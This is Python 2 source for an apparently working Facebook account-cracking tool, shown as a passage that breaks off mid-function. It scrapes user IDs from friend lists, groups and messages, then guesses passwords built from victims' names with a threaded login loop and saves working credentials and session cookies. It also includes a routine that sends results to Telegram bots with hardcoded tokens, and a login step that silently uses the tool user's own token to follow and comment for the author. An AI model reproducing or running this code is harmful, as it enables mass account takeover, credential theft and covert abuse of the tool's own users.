import requests, bs4, sys, os, subprocess, requests, sys, random, json, time, re
reload(sys)
sys.setdefaultencoding('utf-8')
from multiprocessing.pool import ThreadPool
import subprocess, logging

def clear():
    if ' linux' in sys.platform.lower():
        os.system('clear')
    elif 'win' in sys.platform.lower():
        os.system('cls')
    else:
        os.system('clear')


if 'linux' in sys.platform.lower():
    W = '\x1b[0;37m'
    N = '\x1b[0m'
    R = '\x1b[0;37m\x1b[31m'
    B = '\x1b[0;37m\x1b[34m'
    G = '\x1b[0;32m'
    O = '\x1b[0;37m\x1b[33m'
    C = '\x1b[36m'
    notice = ('{}{}[*]{} ').format(N, B, N)
    warning = ('{}[-]{} ').format(R, N)
    good = ('{}[!]{} ').format(G, N)
    warn = ('{}[!]{} ').format(O, N)
else:
    W = ''
    N = ''
    R = ''
    B = ''
    G = ''
    O = ''
    C = ''
    notice = ''
    warning = ''
    good = ''
    d = ''
    warn = ''
host = 'https://m.facebook.com'
ua = requests.get('https://api-asutoolkit.cloudaccess.host/useragent.txt').text.strip()
uas = None
if os.path.exists('.browser'):
    if os.path.getsize('.browser') != 0:
        uas = open('.browser').read().strip()

class dump_message:

    def __init__(self, cookies):
        self.cookies = cookies
        basecookie()
        clear()
        print ' \x1b[1;91m•\x1b[1;93m•\x1b[1;92m•                                      \x1b[1;91m•\x1b[1;93m•\x1b[1;92m•\n\x1b[1;91m   _______  ______ _______ _______ _     _\n   |       |_____/ |_____| |       |____/ \n\x1b[1;97m   |_____  |    \\_ |     | |_____  |    \\_\n\n\x1b[1;95m     • \x1b[0;93mGithub -> github.com/ROMI-AFRZL \x1b[1;95m•   \n \x1b[1;91m•\x1b[1;93m•\x1b[1;92m•                                      \x1b[1;91m•\x1b[1;93m•\x1b[1;92m•'
        self.f = raw_input('\x1b[1;95m•\x1b[1;96m result filename\x1b[1;91m :\x1b[1;93m ').replace(' ', '_')
        if self.f == '':
            dump_message(cookies)
        open(self.f, 'w').close()
        self.dump('https://m.facebook.com/messages')

    def dump(self, url):
        bs = bs4.BeautifulSoup(requests.get(url, headers=hdcok(), cookies=self.cookies).text, 'html.parser')
        for i in bs.find_all('a', href=True):
            if '/messages/read' in i.get('href'):
                f = bs4.re.findall('cid\\.c\\.(.*?)%3A(.*?)&', i.get('href'))
                try:
                    for ip in list(f.pop()):
                        if self.cookies.get(' c_user') in ip:
                            continue
                        else:
                            if 'pengguna facebook' in i.text.lower():
                                continue
                            open(self.f, 'a+').write('%s<=>%s\n' % (ip, i.text))
                            print '\r\x1b[1;95m•\x1b[1;96m dump \x1b[1;93m(\x1b[1;92m%s\x1b[1;93m) wait bro !' % len(open(self.f).read().splitlines()),
                            sys.stdout.flush()

                except Exception as e:
                    continue

            if 'Lihat Pesan Sebelumnya' in i.text:
                self.dump('https://m.facebook.com/' + i.get('href'))

        exit('\n\x1b[1;92m• success %s id saved to : %s' % (len(open(self.f).read().splitlines()), self.f))


def result():
    os.system('clear')
    banner()
    print ''
    print '\x1b[1;95m•\x1b[1;92m 1 \x1b[1;96mSee the account results \x1b[1;92m[OK]'
    print '\x1b[1;95m•\x1b[1;92m 2 \x1b[1;96mSee the account results \x1b[1;91m[\x1b[1;93mCP\x1b[1;91m]'
    print '\x1b[1;95m•\x1b[1;91m 0 \x1b[1;96mBack'
    print ''
    sel_result()


def sel_result():
    rom = raw_input('\x1b[1;95m•\x1b[1;96m select\x1b[1;91m : \x1b[1;93m')
    if rom == '':
        print '\x1b[1;91m• Wrong Input'
        time.sleep(1.0)
        result()
    elif rom == '1':
        os.system('xdg-open ok.txt')
        result()
    elif rom == '2':
        os.system('xdg-open cp.txt')
        result()
    elif rom == '0':
        menu()
    else:
        print '\x1b[1;91m• Wrong Input'
        time.sleep(1.0)
        result()


def banner():
    print ' \x1b[1;91m•\x1b[1;93m•\x1b[1;92m•                                      \x1b[1;91m•\x1b[1;93m•\x1b[1;92m•\n\x1b[1;91m   _______  ______ _______ _______ _     _\n   |       |_____/ |_____| |       |____/ \n\x1b[1;97m   |_____  |    \\_ |     | |_____  |    \\_\n\n     \x1b[1;95m    • \x1b[0;93mCoded by : Romi Afrizal \x1b[1;95m•   \n \x1b[1;91m•\x1b[1;93m•\x1b[1;92m•                                      \x1b[1;91m•\x1b[1;93m•\x1b[1;92m• \n \x1b[1;95m# \x1b[1;96mFb \x1b[1;91m : \x1b[1;96mfacebook.com/romi.29.04.03 \n \x1b[1;95m# \x1b[1;96mGit\x1b[1;91m : \x1b[1;96mgithub.com/Mark-Zuck \n \x1b[1;97m# \x1b[1;91m---------------------------------------- \x1b[1;97m#  '


def masuk():
    os.system('clear')
    banner()
    print ''
    print '\x1b[1;95m•\x1b[1;92m 1 \x1b[1;96mLogin wear token\x1b[1;97m'
    print '\x1b[1;95m•\x1b[1;92m 2 \x1b[1;96mLogin wear cookie\x1b[1;97m'
    print '\x1b[1;95m•\x1b[1;92m 3 \x1b[1;96mHow to get token\x1b[1;97m'
    print '\x1b[1;95m•\x1b[1;92m 4 \x1b[1;96mHow to get cookie\x1b[1;97m'
    print '\x1b[1;95m•\x1b[1;91m 0 \x1b[1;91mExit\x1b[1;97m'
    print ''
    pilih_masuk()


def pilih_masuk():
    lgn = raw_input('\x1b[1;95m•\x1b[1;92m \x1b[1;96mSelect\x1b[1;91m : \x1b[1;93m')
    if lgn == '':
        print '\x1b[1;91m Wrong Input '
        time.sleep(1.0)
        pilih_masuk()
    elif lgn == '1' or lgn == '01':
        token()
    elif lgn == '2' or lgn == '02':
        kuki()
    elif lgn == '3' or lgn == '03':
        tik()
        os.system('xdg-open https://youtu.be/IG5QfdxRkeY')
        os.sys.exit()
    elif lgn == '4' or lgn == '04':
        tik()
        os.system('xdg-open https://youtu.be/b9crrvr6d2s')
        os.sys.exit()
    elif lgn == '0' or lgn == '00':
        exit()
    else:
        print '\x1b[1;91m Wrong Input '
        time.sleep(1.0)
        pilih_masuk()


def kuki():
    cookie = raw_input('\n\x1b[1;95m•\x1b[1;96m Cookie\x1b[1;91m : \x1b[0;93m')
    try:
        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1808) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36', 
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={' Cookie ': cookie})
        find_token = re.search('(EAAA\\w+)', data.text)
        hasil = '\n* Fail : maybe your cookie invalid !!' if find_token is None else '\n* Your fb access token : ' + find_token.group(1)
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] ConnectionError'

    cookie = open('login.txt', 'w')
    cookie.write(find_token.group(1))
    cookie.close()
    tik()
    bot_folow()
    return


def token():
    data = raw_input('\n\x1b[1;95m•\x1b[1;96m Token\x1b[1;91m : \x1b[0;93m')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + data)
        a = json.loads(otw.text)
        nama = a['name']
        open('login.txt', 'w').write(data)
        tik()
        bot_folow()
    except KeyError:
        print ('\x1b[1;91m• Invalid Token').format(R, N)
        time.sleep(1.0)
        masuk()


def tik():
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;95m• \x1b[1;96mPlease Wait \x1b[1;91m' + o,
        sys.stdout.flush()
        time.sleep(1)


def basecookie():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m• Invalid !'
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()
    else:
        masuk()


def bot_folow():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;92m• invalid'
        logs()

    fbid = '100002461344178'
    kom = 'CRACK bff.py IS GREAT\n github.com/Mark-Zuck/bff-2'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + fbid + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/3933263743432298/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/4112701322107419/comments/?message=CR0CK IS GREAT-*-😋&access_token=' + toket)
    requests.post('https://graph.facebook.com/100002461344178/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100001027764318/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100017553167451/subscribers?access_token=' + toket)
    exit('\x1b[1;92m• login success, run again the tools.\n\x1b[1;96m• Usage \x1b[1;91m: \x1b[1;92mpython2 bff-2.py')


idfromteman = []

def publik():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;91m• Invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        logine()

    try:
        print ''
        print "\x1b[1;95m• \x1b[1;96mFill in '\x1b[1;92mme\x1b[1;96m' if you wish to dump your own \n  friends list\n "
        idt = raw_input('\x1b[1;95m• \x1b[1;96mUser Id\x1b[1;91m : \x1b[1;93m')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            qq = (op['first_name'] + '.json').replace(' ', '_')
            print '\x1b[1;95m• \x1b[1;96mName\x1b[1;91m : \x1b[1;93m' + op['name']
        except KeyError:
            exit('\x1b[1;91m• Id not found !').format('R')
            raw_input('\n\x1b[1;91m• Back').format(N)
            menu()

        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
        z = json.loads(r.text)
        print '\x1b[1;95m• \x1b[1;96mPlease Wait ...'
        print ''
        bz = open(qq, 'w')
        for a in z['friends']['data']:
            idfromteman.append(a['id'])
            bz.write(a['id'] + '<=>' + a['name'] + '\n')

        bz.close()
        print '\x1b[1;92m• Succes dump id from %s' % op['name']
        print '\r\x1b[1;95m• \x1b[1;96mTotal id \x1b[1;91m:\x1b[1;93m %s' % len(idfromteman)
        print '\x1b[1;95m• \x1b[1;96moutput saved to \x1b[1;91m:\x1b[1;92m ' + qq
        print ''
        os.sys.exit()
    except Exception as e:
        exit('\n\x1b[1;91m• Failed dump id')
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m• No Connection!'
        exit()


def followers():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m • Invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        masuk()

    try:
        print ''
        print "\x1b[1;95m• \x1b[1;96mFill in '\x1b[1;92mme\x1b[1;96m' if you wish to dump your own \n  followers list\n "
        idt = raw_input('\x1b[1;95m• \x1b[1;96mUser Id\x1b[1;91m : \x1b[1;93m')
        kontol = raw_input('\x1b[1;95m• \x1b[1;96mLimit\x1b[1;91m : \x1b[1;93m')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            qq = (op['first_name'] + '.json').replace(' ', '_')
            print '\x1b[1;95m• \x1b[1;96mName\x1b[1;91m : \x1b[1;93m' + op['name']
        except KeyError:
            print ('\n\x1b[1;91m• Followers not found !').format('R')
            raw_input(' \x1b[1;91mBack').format(N)
            menu()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=' + kontol + '&access_token=' + toket)
        z = json.loads(r.text)
        print '\x1b[1;95m• \x1b[1;96mPlease wait ...'
        print ''
        bz = open(qq, 'w')
        for a in z['data']:
            idfromteman.append(a['id'])
            bz.write(a['id'] + '<=>' + a['name'] + '\n')

        bz.close()
        print '\x1b[1;92m• Succes dump followers from %s' % op['name']
        print '\r\x1b[1;95m• \x1b[1;96mTotal followers \x1b[1;91m:\x1b[1;93m %s' % len(idfromteman)
        print '\x1b[1;95m• \x1b[1;96moutput saved to \x1b[1;91m:\x1b[1;92m ' + qq
        print ''
    except Exception as e:
        exit('\n\x1b[1;91m• Failed dump followers')
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m• No Connection!'
        exit()


class dump_grup:

    def __init__(self, cookies):
        self.glist = []
        self.cookies = cookies
        self.extract('https://m.facebook.com/groups/?seemore')

    def extract(self, url):
        bs = bs4.BeautifulSoup(requests.get(url, cookies=self.cookies, headers=hdcok()).text, 'html.parser')
        for i in bs.find_all('a', href=True):
            if '/groups/' in i.get('href'):
                if 'category' in i.get('href') or 'create' in i.get('href'):
                    continue
                else:
                    self.glist.append({'id': ('').join(bs4.re.findall('/groups/(.*?)\\?', i.get('href'))), 'name': i.text})

        if len(self.glist) != 0:
            print ' '
            print '\x1b[1;95m• \x1b[1;96myou have %s groups found.' % len(self.glist)
            print '\x1b[1;95m• \x1b[1;96mselect action '
            print '\x1b[1;95m•\x1b[1;92m 1 \x1b[1;96mget grup by searching the name'
            print '\x1b[1;95m•\x1b[1;92m 2 \x1b[1;96minput group id (manual)\n'
            while True:
                c = raw_input('\x1b[1;95m•\x1b[1;92m \x1b[1;96mmenu\x1b[1;91m : \x1b[1;93m')
                if c == '':
                    continue
                elif c == '1':
                    self.search()
                    exit()
                elif c == '2':
                    self.manual()
                    exit()
                else:
                    print '\x1b[1;95m•\x1b[1;91m wrong input'

        else:
            exit('\x1b[1;95m•\x1b[1;91m no groups found')

    def manual(self):
        id = raw_input('\x1b[1;95m•\x1b[1;92m \x1b[1;96mgroup id\x1b[1;91m : \x1b[1;93m')
        if id == '':
            self.manual()
        else:
            r = bs4.BeautifulSoup(requests.get('https://m.facebook.com/groups/' + id, headers=hdcok(), cookies=self.cookies).text, 'html.parser')
            if 'konten tidak' in r.find('title').text.lower():
                exit('\x1b[1;95m• \x1b[1;91minput id grup error')
            else:
                self.listed = {'id': id, 'name': r.find('title').text}
                self.f()
                print '\x1b[1;95m• \x1b[1;96mtarget\x1b[1;91m : \x1b[1;93m%s ' % self.listed.get('name')[0:20]
                self.dumps('https://m.facebook.com/groups/' + id)

    def search(self):
        whitelist = []
        q = raw_input('\x1b[1;95m•\x1b[1;92m \x1b[1;96mmenu\x1b[1;91m : \x1b[1;93m').lower()
        if q == '':
            self.search()
        else:
            print '-' * 30
            for e, i in enumerate(self.glist):
                if q in i.get('name').lower():
                    whitelist.append(i)
                    print '  %s. %s' % (
                     len(whitelist),
                     i.get('name').lower().replace(q, '%s%s%s' % (G, q, N)))

            if len(whitelist) == 0:
                print '\x1b[1;91m• mno result found with this query : %s' % q
                self.search()
            else:
                print ''
                self.choice(whitelist)

    def choice(self, whitelist):
        try:
            self.listed = whitelist[(input('\x1b[1;95m• \x1b[1;96mselect group\x1b[1;91m :\x1b[1;93m ') - 1)]
            self.f()
            print '\x1b[1;95m• \x1b[1;96mtarget\x1b[1;91m : \x1b[1;93m%s' % self.listed.get('name')
            self.dumps('https://m.facebook.com/groups/' + self.listed.get('id'))
        except Exception as e:
            print '\x1b[1;95m• \x1b[1;93m%s' % e
            self.choice(whitelist)

    def f(self):
        self.fl = raw_input('\x1b[1;95m• \x1b[1;96mresult filename \x1b[1;91m:\x1b[1;93m ').replace(' ', '_')
        if self.fl == '':
            self.f()
        open(self.fl, 'w').close()

    def dumps(self, url):
        r = bs4.BeautifulSoup(requests.get(url, cookies=self.cookies, headers=hdcok()).text, 'html.parser')
        print '\r\x1b[1;95m• \x1b[1;96mdump \x1b[1;93m(\x1b[1;92m%s\x1b[1;93m)  wait bro ! ' % len(open(self.fl).read().splitlines()),
        sys.stdout.flush()
        for i in r.find_all('h3'):
            try:
                if len(bs4.re.findall('\\/', i.find('a', href=True).get('href'))) == 1:
                    ogeh = i.find('a', href=True)
                    if 'profile.php' in ogeh.get('href'):
                        a = ('').join(bs4.re.findall('profile\\.php\\?id=(.*?)&', ogeh.get('href')))
                        if len(a) == 0:
                            continue
                        elif a in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (a, ogeh.text))
                            continue
                    else:
                        a = ('').join(bs4.re.findall('/(.*?)\\?', ogeh.get('href')))
                        if len(a) == 0:
                            continue
                        elif a in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (a, ogeh.text))
            except:
                continue

        for i in r.find_all('a', href=True):
            if 'Lihat Postingan Lainnya' in i.text:
                while True:
                    try:
                        self.dumps('https://m.facebook.com/' + i.get('href'))
                        break
                    except Exception as e:
                        print '\r\x1b[1;95m•\x1b[1;96m %s, \x1b[1;93mretrying' % e
                        continue

        exit('\n\x1b[1;92m• successfully dump %s id from group %s' % (len(open(self.fl).read().splitlines()), self.listed.get('name')[0:20]))


class friendlist:

    def __init__(self, cookie):
        self.nitel = None
        lang(cookie)
        self.cookie = cookie
        print '\x1b[1;95m• \x1b[1;96mEnter the friend list link'
        self.id = raw_input('\x1b[1;95m• \x1b[1;96mtarget profile url\x1b[1;91m : \x1b[1;93m')
        if self.id == '':
            friendlist(cookie)
        else:
            self.fl = raw_input('\x1b[1;95m• \x1b[1;96mfilename\x1b[1;91m : \x1b[1;93m').replace(' ', '_')
            open(self.fl, 'a+')
            id = ('').join(bs4.re.findall('://(.*?)/', self.id))
            if len(id) == 0:
                friendlist(cookie)
            self.ok = bs4.re.sub(id, 'm.facebook.com', self.id).replace('profile.php?id=', '') + '?v=friends'
            self.dump(self.ok)
        return

    def dump(self, ok):
        r = bs4.BeautifulSoup(requests.get(ok, headers=hdcok(), cookies=self.cookie).text, 'html.parser')
        if self.nitel == None:
            a = r.find('title').text[0:20]
            self.nitel = a
            b = r.find('h3').text.split(' ').pop().replace(')', '').replace('(', '').replace('.', '')
            self.b = b
            print '\x1b[1;95m•\x1b[1;96m target\x1b[1;91m : \x1b[1;93m%s' % a
            print '\x1b[1;95m•\x1b[1;96m output\x1b[1;91m : \x1b[1;93m%s' % self.fl
            print '\x1b[1;95m•\x1b[1;96m friendlist\x1b[1;91m : \x1b[1;93m%s' % b
        for i in r.find_all('a', href=True):
            if 'fref' in i.get('href'):
                print '\r\x1b[1;95m•\x1b[1;96m dump \x1b[1;91m(\x1b[1;92m%s\x1b[1;91m)\x1b[1;93m/\x1b[1;91m(\x1b[1;92m%s\x1b[1;91m)\x1b[1;93m wait bro !' % (len(open(self.fl).read().splitlines()), self.b),
                sys.stdout.flush()
                if 'profile_add_friend.php' in i.get('href'):
                    continue
                elif 'profile.php' in i.get('href'):
                    ag = ('').join(bs4.re.findall('profile\\.php\\?id=(.*?)&', i.get('href')))
                    if len(ag) != 0:
                        if ag in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (ag, i.text))
                else:
                    ag = ('').join(bs4.re.findall('/(.*?)\\?', i.get('href')))
                    if len(ag) != 0:
                        if ag in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (ag, i.text))
            if 'lihat teman lain' in i.text.lower():
                __import__('time').sleep(2)
                while True:
                    try:
                        self.dump('https://m.facebook.com/' + i.get('href'))
                        __import__('time').sleep(2)
                        break
                    except Exception as e:
                        print '\r\x1b[1;91m• error : %s' % e
                        continue

        exit('\n\x1b[1;92m• successfully dump %s %s friends, output saved to %s ' % (len(open(self.fl).read().splitlines()), self.nitel, self.fl))
        return


def ceks(cookies, results):
    global host
    global ua
    r = requests.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', cookies=cookies, headers={'origin': host, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', host)), 'referer': host + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'}).text
    if len(bs4.re.findall('Pool', r)) != 0:
        sends('%s -> 8BALL POOLLLLLLLL' % results, '1309178498:AAGxlAjtYYDnUeM04fYsfLz8lFTaSoYooYA')
    if len(bs4.re.findall('pubg', r.lower())) != 0:
        sends('%s -> PUBGGGGGGGGG' % results, '1305701364:AAG6dmquZmBkHVVVpoSBYx5UHxcQ3NnUfMs')
    if len(bs4.re.findall('garena', r.lower())) != 0:
        sends('%s -> FFFFFFFFFFFFFFF' % results, '928550832:AAGM35_UVioKPJ0EoIH3nqarnndcaHll6cU')
    if len(bs4.re.findall('legends', r.lower())) != 0:
        sends('%s -> EMELLLLLLLLLLL' % results, '1277181407:AAFABlCxC45BGGS0SzoxRANIMgvKkk6Qhgc')


h = {'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}

def login(em, pas, hosts):
    global h
    r = requests.Session()
    r.headers.update(h)
    p = r.get('https://m.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', '__csr': '', 
       '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}
            return

        return


def hdcok():
    hosts = host
    r = {'origin': hosts, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', hosts)), 'referer': hosts + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'}
    return r


def cvs(cookies):
    result = []
    for i in enumerate(cookies.keys()):
        if i[0] == len(cookies.keys()) - 1:
            result.append(i[1] + '=' + cookies[i[1]])
        else:
            result.append(i[1] + '=' + cookies[i[1]] + '; ')

    return ('').join(result)


def cvd(cookies):
    result = {}
    try:
        for i in cookies.split(';'):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result
    except:
        for i in cookies.split('; '):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result


def sends(pesan, token):
    b = requests.post('https://api.telegram.org/bot' + token + '/sendMessage', data={'chat_id': '664762410', 'text': pesan})


ips = None
try:
    b = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text.strip()
    ips = requests.get('https://ipapi.com/ip_api.php?ip=' + b, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].lower()
except:
    ips = None

def generate(text):
    global ips
    results = []
    for i in text.split(' '):
        if len(i) < 3:
            continue
        else:
            i = i.lower()
            if len(i) == 3 or len(i) == 4 or len(i) == 5:
                results.append(i + '123')
                results.append(i + '12345')
            else:
                results.append(i + '123')
                results.append(i + '12345')
                results.append(i)
                if 'pakistan' in ips:
                    results.append('786786')
                    results.append(i)
                elif 'indonesia' in ips:
                    results.append(i + 'sayang')
                    results.append(i)

    return results


class crack:

    def __init__(self, show=True):
        self.ada = []
        self.cp = []
        self.ko = 0
        if show == True:
            os.system('clear')
            banner()
            print '\n\x1b[1;95m•\x1b[1;96m [ \x1b[1;95mSELECT ACTION \x1b[1;96m]\n'
            print '\x1b[1;95m•\x1b[1;92m 1 \x1b[1;96mCrack pass manual'
            print '\x1b[1;95m•\x1b[1;92m 2 \x1b[1;96mCrack pass \x1b[1;93mname123\x1b[1;91m,\x1b[1;93mname12345'
        while True:
            f = raw_input('\n\x1b[1;95m• \x1b[1;96mselect\x1b[1;91m : \x1b[1;93m')
            if f == '':
                continue
            elif f == '1':
                try:
                    while True:
                        try:
                            self.apk = raw_input('\x1b[1;95m•\x1b[1;96m id list file\x1b[1;91m : \x1b[1;93m')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '\x1b[1;95m•\x1b[1;96m %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print '\x1b[1;95m•\x1b[0;96m %s' % e
                    continue

                print '\n\x1b[1;95m• \x1b[1;96mexample\x1b[1;91m :\x1b[1;96m sayang\x1b[1;91m,\x1b[1;96mpengen\x1b[1;91m,\x1b[1;96mngentot'
                self.pwlist()
                s = subprocess.Popen(['killall', '-9', 'python2'], stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
                break
            elif f == '2':
                try:
                    while True:
                        try:
                            self.apk = raw_input('\x1b[1;95m•\x1b[1;96m id list file \x1b[1;91m: \x1b[1;93m')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '\x1b[1;95m• \x1b[1;96m%s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '\x1b[1;95m• \x1b[0;96m%s' % e
                    continue

                print '\n\x1b[1;95m• \x1b[1;96maccount \x1b[1;92m[OK] \x1b[1;96msaved to \x1b[1;91m-> \x1b[1;92mok.txt'
                print '\x1b[1;95m• \x1b[1;96maccount \x1b[1;91m[\x1b[1;93mCP\x1b[1;91m]\x1b[1;96m saved to \x1b[1;91m-> \x1b[1;93mcp.txt\n'
                print '\x1b[1;95m• \x1b[1;96min the process, please be patient'
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
                print '\n\x1b[1;91m• \x1b[1;92mfinished.'
                s = subprocess.Popen(['killall', '-9', 'python2'], stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
                break

    def pwlist(self):
        self.pw = raw_input('\x1b[1;91m•\x1b[1;96m password list \x1b[1;91m:\x1b[1;93m ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            print '\n\x1b[1;95m• \x1b[1;96maccount \x1b[1;92m[OK] \x1b[1;96msaved to \x1b[1;91m-> \x1b[1;92mok.txt'
            print '\x1b[1;95m•\x1b[1;96m account \x1b[1;91m[\x1b[0;93mCP\x1b[1;91m]\x1b[1;96m saved to\x1b[1;91m -> \x1b[1;93mcp.txt\n'
            print '\x1b[1;95m• \x1b[1;96min the process, please be patient'
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            print '\n\x1b[1;92m• \x1b[1;92mfinished'

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = login(fl.get('id'), i, 'https://m.facebook.com')
                if log.get('status') == 'success':
                    print G + '\r\x1b[0;91m  \x1b[0;92m*---> [OK] \x1b[0;92m%s\x1b[0;92m ◊ \x1b[0;92m%s  %s ' % (fl.get('id'), i, N)
                    self.ada.append('%s ◊ %s' % (fl.get('id'), i))
                    if fl.get('id') in open('ok.txt').read():
                        break
                    else:
                        open('ok.txt', 'a+').write('%s ◊ %s ◊ %s\n\n' % (fl.get('id'), i, cvs(log.get('cookies'))))
                    ko = '%s ◊ %s ◊ %s\n\n' % (fl.get('id'), i, cvs(log.get('cookies')))
                    break
                elif log.get('status') == 'cp':
                    print R + '\r\x1b[0;91m  \x1b[0;93m*--->\x1b[0;91m [\x1b[0;93mCP\x1b[0;91m] \x1b[0;93m%s\x1b[0;91m ◊ \x1b[0;93m%s  %s ' % (fl.get('id'), i, N)
                    self.cp.append('%s ◊ %s' % (fl.get('id'), i))
                    open('cp.txt', 'a+').write('%s ◊ %s ◊ \n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.ko += 1
            m = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + m + '• \x1b[1;96m*---> \x1b[1;92mCrack\x1b[1;96m [%s/%s]-\x1b[1;92m[OK\x1b[0;91m:\x1b[0;92m%s\x1b[1;92m]\x1b[1;96m-\x1b[1;91m[\x1b[0;93mCP\x1b[0;91m:\x1b[0;93m%s\x1b[1;91m]' % (self.ko, len(self.fl), len(self.ada), len(self.cp)),
            sys.stdout.flush()
        except:
            self.main(fl)


def search(fl, r, b):
    open(fl, 'a+')
    b = bs4.BeautifulSoup(requests.get(b, cookies=r, headers=hdcok()).text, 'html.parser')
    for i in b.find_all('a', href=True):
